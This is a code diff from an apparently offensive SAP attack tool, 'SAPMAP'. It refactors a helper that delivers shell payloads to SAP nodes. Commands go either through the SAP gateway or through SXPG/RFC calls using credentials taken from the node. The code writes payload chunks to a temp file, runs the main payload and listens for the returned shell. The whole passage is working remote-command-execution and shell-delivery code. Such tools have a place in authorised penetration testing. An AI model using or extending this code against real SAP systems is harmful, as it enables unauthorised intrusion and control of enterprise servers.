@@ -1464,27 +1464,38 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"{payload['display']}")
                 print(f"    Listening on 0.0.0.0:{shell_port}")
 
+            def _exec_step(cmd, params):
+                """Execute a single step via GW or SXPG.
+                For SXPG, split 'cmd.exe /C ...' into binary + args.
+                For GW, full command line goes in EXTPROG.
+                """
+                if method == "gateway":
+                    return sapmap_exploit.execute_gw_command(
+                        node, cmd, params)
+                else:
+                    creds = node.best_credentials()
+                    if not creds:
+                        return {"success": False,
+                                "error": "No credentials"}
+                    # SXPG needs binary in EXTPROG, args in PARAMS.
+                    # GW payloads put full command in cmd with empty
+                    # params. Split at first space for SXPG.
+                    if params == "" and " " in cmd:
+                        parts = cmd.split(" ", 1)
+                        cmd, params = parts[0], parts[1]
+                    return sapmap_rfc.execute_local_command(
+                        node, cmd, params, creds)
+
             # Execute pre-steps (e.g. writing script chunks to temp file)
             pre_steps = payload.get("steps", [])
             if pre_steps:
                 print(f"[*] {sid}: Writing payload to temp file "
                       f"({len(pre_steps)} chunks)...")
                 for step in pre_steps:
-                    if method == "gateway":
-                        sapmap_exploit.execute_gw_command(
-                            node, step["command"], step["params"])
-                    else:
-                        creds = node.best_credentials()
-                        if creds:
-                            sapmap_rfc.execute_local_command(
-                                node, step["command"], step["params"],
-                                creds)
+                    _exec_step(step["command"], step["params"])
 
             # Execute the main payload command
-            if method == "gateway":
-                result = sapmap_exploit.execute_gw_command(
-                    node, payload["command"], payload["params"])
-            else:
+            if method != "gateway":
                 creds = node.best_credentials()
                 if not creds:
                     print(f"[-] {sid}: No credentials for SXPG shell")
@@ -1493,8 +1504,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             _shell_session.status = "error"
                             _shell_session.error_msg = "No credentials for SXPG"
                     return
-                result = sapmap_rfc.execute_local_command(
-                    node, payload["command"], payload["params"], creds)
+            result = _exec_step(payload["command"], payload["params"])
 
             if result.get("success"):
                 print(f"[+] {sid}: Shell payload delivered")
